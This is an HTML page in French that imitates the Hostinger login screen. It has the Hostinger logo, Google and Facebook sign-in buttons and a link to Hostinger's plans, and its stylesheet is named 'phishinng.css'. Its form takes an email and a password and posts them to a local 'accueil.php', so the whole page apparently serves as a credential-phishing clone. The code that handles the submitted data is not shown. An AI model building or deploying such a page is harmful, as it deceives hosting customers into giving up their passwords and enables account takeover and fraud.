<!DOCTYPE html>
<html lang="fr">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Connexion</title>
    <link rel="stylesheet" href="phishinng.css"> 
</head>
<body>
    <img src="img/Hostinger.png" alt="Hostinger" class="logo">
<div class="container"> <!-- Conteneur pour centrer le formulaire -->
        <h2>Se connecter</h2>
<div class="cubes-container">
    <div class="cube">
    <a href="https://accounts.google.com/v3/signin/identifier?continue=https%3A%2F%2Fwww.google.com%2Fsearch%3Fq%3Dconnexion%2Bgoogle%26rlz%3D1C1CHBF_frFR1121FR1121%26oq%3Dconnexion%2Bgo%26pf%3Dcs%26sourceid%3Dchrome%26ie%3DUTF-8&ec=GAZAAQ&hl=fr&passive=true&ifkv=AcMMx-f2QnIOmdj76TGlTMg5sxc-g0JrIl2YZAQ5_CXNlkUdOEizX38bRI9zoY7SRtnqGzNXl6Gm&ddm=1&flowName=GlifWebSignIn&flowEntry=ServiceLogin">
        <img src="img/chercher.png" alt="Description de l'image 1">
    </a>
    </div>
    <div class="cube1">
    <a href="https://www.facebook.com/login" >
        <img src="img/facebook.png" alt="Description de l'image 2">
    </a>
    </div><br>
</div><br>
        <div class="separator">
            <div class="line"></div>
            <span>ou</span>
            <div class="line"></div>
        </div>
        <form method="post" action="accueil.php">
        <input type="email" name="email" id="email" placeholder="E-mail" required>
            <input type="password" name="mdp" id="mdp" placeholder="Mot de passe"required>
             <div class="remember-me">
                <input type="checkbox" id="remember" name="remember">
                <label for="remember">Souviens-toi de moi</label>
            </div><br>

            <input type="submit" value="Se connecter" name="send_connexion" class="btn-connect" >
        </form>

        <div class="forgot-password">  
            <form method="post" action="oubli.php">
                <input type="submit" value="Mot de passe oublié ?" name="send_email" class="btn-forgot">
                
            </form>
        </div><br>
        <p class="text-main">Pas encore membre? <a href="https://www.hostinger.fr/hebergement-web#pricing?_ga=GA1.2.601411981.1728999692" class="link-plan">Choisissez un plan d'hébergement</a> et commencez maintenant !</p>

    </div>
</body>
</html>